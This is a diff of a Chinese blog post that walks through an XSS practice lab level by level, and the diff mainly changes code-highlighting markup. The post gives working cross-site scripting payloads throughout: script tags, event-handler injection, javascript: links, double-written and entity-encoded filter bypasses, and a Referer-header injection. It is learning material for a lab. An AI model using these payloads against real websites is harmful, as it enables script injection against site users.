@@ -30,7 +30,7 @@
     <script src="/libs/jquery/jquery.min.js"></script>
 
 <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Chenluo" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+</head>
 
 
 
@@ -469,6 +469,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -480,8 +483,8 @@
 <li><p>根据地址拦确定，提交的参数是name</p>
 </li>
 <li><p>构造name的payload</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3tv9covbj30jz094wf4.jpg" alt="image-20210502093123164"></p>
 </li>
 <li><p>所以这一关没有进行任何的防护措施</p>
@@ -495,23 +498,23 @@
 <ol start="2">
 <li>我们需要先把input标签闭合才能执行我们自己的标签</li>
 </ol>
-<pre class=" language-js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3u3e1u50j30rb0efjsr.jpg" alt="image-20210502093912217"></p>
 <p><strong>还有另一种方法</strong></p>
 <p>既然form有自己的标签，那么我们直接利用标签的属性进行弹窗</p>
 <ul>
 <li>构造payload</li>
 </ul>
-<pre class=" language-js"><code class="language-js"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3u8khyyvj30gr0a8aaz.jpg" alt="image-20210502094410387"></p>
 <h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uclxr89j30x104ogn3.jpg" alt="image-20210502094803444"></p>
 <p>很显然这里的‘&lt;’’&gt;’是被编译过的，因此没办法使用标签，那么，就用属性来做了</p>
 <p><strong>同样注意到这里value的闭合方式是’’</strong>.</p>
 <p>payload</p>
-<pre class=" language-js"><code class="language-js"><span class="token string">'onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">'onclick='</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uf04jfvj30hj08ymxz.jpg" alt="image-20210502095021729"></p>
 <h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uhjkvnrj30kn07gt9w.jpg" alt="image-20210502095248422"></p>
 <ol>
@@ -523,8 +526,8 @@
 </li>
 </ol>
 <p>payload</p>
-<pre class=" language-js"><code class="language-js"><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3ulmxu9tj30jz0cs0tu.jpg" alt="image-20210502095644563"></p>
 <p>所以，本关就是过滤了尖括号</p>
 <h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uqgmintj30m007bmxr.jpg" alt="image-20210502100122792"></p>
@@ -540,8 +543,8 @@
 <p><strong>ri变成了r_i</strong></p>
 <p>这两标签不能用了，那用其他的吧</p>
 <p>such as:</p>
-<pre class=" language-js"><code class="language-js"><span class="token string">">&lt;a href="</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">">&lt;a href="</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uuggojkj30kx0a3q3v.jpg" alt="image-20210502100513142"></p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3uvd7au5j30dc04074o.jpg" alt="image-20210502100605210"></p>
 <p>点击一下图片就会弹窗</p>
@@ -555,40 +558,38 @@
 <ol start="2">
 <li>那么试一下大小写</li>
 </ol>
-<pre class=" language-js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token constant">SCRIPT</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3vad44elj30q908gt9p.jpg" alt="image-20210502102030375"></p>
 <h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h4><ol>
 <li>输入</li>
 </ol>
-<pre class=" language-js"><code class="language-js"><span class="token string">">&lt;script>alert(1)&lt;/script>&lt;"</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">">&lt;script>alert(1)&lt;/script>&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3veno3rlj30gv04w0tz.jpg" alt="image-20210502102437575"></p>
 <p>直接连script给整没了。。。</p>
-<pre class=" language-js"><code class="language-js"><span class="token string">">&lt;href a="</span>javascript<span class="token punctuation">:</span><span class="token function">alert1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">">&lt;href a="</span>javascript<span class="token operator">:</span><span class="token function">alert1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3vgup4vdj30i603m0tm.jpg" alt="image-20210502102644271"></p>
 <ol>
 <li>根据sql的经验，使用嵌套的方式试试吧</li>
 </ol>
 <p><strong>字符串里面的script被替换成“=”，但是标签里面的script被替换成空</strong></p>
-<pre class=" language-js"><code class="language-js"><span class="token string">">&lt;scrscriptipt>alert(1)&lt;/scrscriptipt>&lt;"</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">">&lt;scrscriptipt>alert(1)&lt;/scrscriptipt>&lt;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3vu5tgpvj30lk0bmgmv.jpg" alt="image-20210502103932091"></p>
 <p>那么，这里就是双写</p>
 <h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h4><ol>
 <li><p>输入</p>
-<pre class=" language-js"><code class="language-js">a <span class="token operator">=</span> javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
-</li>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">a <span class="token operator">=</span> javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3w1ar5unj30so08aabp.jpg" alt="image-20210502104623789"></p>
 <p>这里又是被转换了。。。</p>
 <ol start="2">
 <li>如果是</li>
 </ol>
-<pre class=" language-js"><code class="language-js"><span class="token string">">&lt;href a="</span>javacript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">">&lt;href a="</span>javacript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3w8t3qo8j311i066760.jpg" alt="image-20210502105336456"></p>
 <p>狠毒啊！！！</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3wa2u7ttj30h40af3zs.jpg" alt="image-20210502105449460"></p>
@@ -599,17 +600,17 @@
 <ol start="4">
 <li>这里还有个函数</li>
 </ol>
-<pre class=" language-js"><code class="language-js">htmlspecialchars<span class="token punctuation">:</span>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">htmlspecialchars<span class="token operator">:</span>
 
-         把预定义的字符 <span class="token string">"&lt;"</span> （小于）和 <span class="token string">">"</span> （大于）转换为 HTML 实体：
-</code></pre>
+ 		把预定义的字符 <span class="token string">"&lt;"</span> （小于）和 <span class="token string">">"</span> （大于）转换为 <span class="token constant">HTML</span> 实体：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>这个函数是把没有经过处理的函数进行html实体编码</strong></p>
 <p>尝试先对构造的payload进行html实体解码，再试试</p>
-<pre class=" language-js"><code class="language-js">javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
 html编码
-<span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span>
-</code></pre>
+<span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6c<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x31<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3wq8gqh5j30fl08a0u4.jpg" alt="image-20210502111021552"></p>
 <h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h4><ol>
 <li>继续按第八关的做法，发现不行</li>
@@ -623,8 +624,8 @@ html编码
 <li>他这里做了一下选择</li>
 </ol>
 <p>意思是，如果语句中有http://才能通过，那么我们加上,同时还要满足脚本语句，尝试把，http加入到alert()里面</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&amp;</span>#x6a<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3a<span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'http://'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3x46o80hj30r009dta0.jpg" alt="image-20210502112345257"></p>
 <p>ok</p>
 <h4 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h4><ol>
@@ -645,14 +646,14 @@ html编码
 <p>没变化，可能不是这个</p>
 <p>换成t_history也没变化</p>
 <p>那么就只有t_sort</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">?</span>t_sort<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3xeyn14aj30n104t0tw.jpg" alt="image-20210502113407530"></p>
 <p>在这里他把我们所有的&lt;&gt;都搞没了</p>
 <p><strong>尝试事件注入吧</strong></p>
 <p>由于是隐藏标签，构建payload时：</p>
-<pre class=" language-js"><code class="language-js">t_sort<span class="token operator">=</span><span class="token number">2</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token string">" type="</span>text"
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">t_sort<span class="token operator">=</span><span class="token number">2</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token string">" type="</span>text"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>先利用text标签让他显示出来，再点击执行js代码</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq3xx57ojqj30mn09a0wn.jpg" alt="image-20210502115136024"></p>
 <h4 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h4><ol>
@@ -677,7 +678,7 @@ html编码
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq4yeqt5kcj30wm07fmyl.jpg" alt="image-20210503085404180"></p>
 <p>注意:</p>
 <p>Referer字段必须与上面的字段接着。。。</p>
-<pre class=" language-http"><code class="language-http">GET /xss/level11.php HTTP/1.1
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token property">GET</span> /xss/level11.php HTTP/1.1</span>
 <span class="token header-name keyword">Host:</span> 192.168.220.12
 <span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
 <span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -689,13 +690,13 @@ html编码
 <span class="token header-name keyword">Pragma:</span> no-cache
 <span class="token header-name keyword">Cache-Control:</span> no-cache
 <span class="token header-name keyword">Content-Length:</span> 0
-<span class="token header-name keyword">Referer:</span>  2" onclick="alert(1)" type="text"
-</code></pre>
+<span class="token header-name keyword">Referer:</span>  2" onclick="alert(1)" type="text"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <ol start="4">
 <li>构造payload</li>
 </ol>
-<pre class=" language-js"><code class="language-js">Referer<span class="token punctuation">:</span> <span class="token number">1</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">" type= "</span>text"
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">Referer<span class="token operator">:</span> <span class="token number">1</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">" type= "</span>text"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq519qijuqj30kz0b2js9.jpg" alt="image-20210503103303703"></p>
 <p>OKK!!</p>
 <h4 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h4><ol>
@@ -706,8 +707,8 @@ html编码
 <ol start="2">
 <li>构造payload</li>
 </ol>
-<pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">" type="</span>text"
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token number">1</span><span class="token string">" onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">" type="</span>text"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq51qchvx5j30xy07r75w.jpg" alt="image-20210503104901873"></p>
 <ol start="3">
 <li>点击一下完成xss</li>
@@ -742,13 +743,17 @@ html编码
 <p>这里找到了注入点</p>
 <p>ng-include 指令用于包含外部的 HTML 文件。而且只能包含同一级目录的。</p>
 <p>在15关我们可以包含第一关的页面(xss简单) 同时还注意到他对注入的字符串进行了html实体编码</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'level1.php'</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'level1.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq52k5bf6ij30p60kcwle.jpg" alt="image-20210503111738101"></p>
 <p>由于实体编码，就采用事件注入吧</p>
 <p>构造payload</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'levael1.php?name=&lt;input onclick=alert(2)>'</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">?</span>src<span class="token operator">=</span><span class="token string">'levael1.php?name=&lt;input onclick=alert(2)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq533kktizj30wt0fb7a8.jpg" alt="image-20210503113619450"></p>
 <p>OKK</p>
 <h4 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h4><ol>
@@ -762,8 +767,8 @@ html编码
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq538ccmbnj30ns08dgmk.jpg" alt="image-20210503114053975"></p>
 <p>过滤了空格，/，script</p>
 <p>尝试其他的标签</p>
-<pre class=" language-js"><code class="language-js"><span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>input<span class="token operator">%</span>0Aonclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>input<span class="token operator">%</span><span class="token number">0</span>Aonclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq53xhbbxrj30ke0bcq67.jpg" alt="image-20210503120502298"></p>
 <h4 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h4><p>查看源代码</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq544yiouvj311t097q4s.jpg" alt="image-20210503121216312"></p>
@@ -772,8 +777,8 @@ html编码
 <p>根据地址栏发现注入点，但是不清楚怎么处理，看一下源代码</p>
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq548l80cqj30nl047jrq.jpg" alt="image-20210503121544119"></p>
 <p>直接利用事件注入就可以</p>
-<pre class=" language-js"><code class="language-js"> onmouseover<span class="token operator">=</span>javascript<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-</code></pre>
+<pre class="line-numbers language-js" data-language="js"><code class="language-js">onmouseover<span class="token operator">=</span>javascript<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gq54ka3edqj30rp0cujsp.jpg" alt="image-20210503122659416"></p>
 <p>火狐看不到图，我换成了google</p>
 <h4 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h4><p>和17题类似，看一下源代码做了什么处理</p>
@@ -789,10 +794,10 @@ html编码
 <p>和之前不一样，这里需要闭合这个双引号，不然就以为只是一个属性，之前是不需要闭合的</p>
 <p>由于经过了htmlspecialchars处理，双引号也在被处理的范围//</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/borrrrring/article/details/113573271?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">参考</a></p>
-<pre><code>Flash产生的xss问题主要有两种方式：
+<pre class="line-numbers language-none"><code class="language-none">Flash产生的xss问题主要有两种方式：
  1.加载第三方资源
- 2.与javascript通信引发XSS。
-</code></pre>
+ 2.与javascript通信引发XSS。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>由于各种浏览器，都看不到注入的结果是啥，先暂停一下，之后再弄。。</p>
 
                 
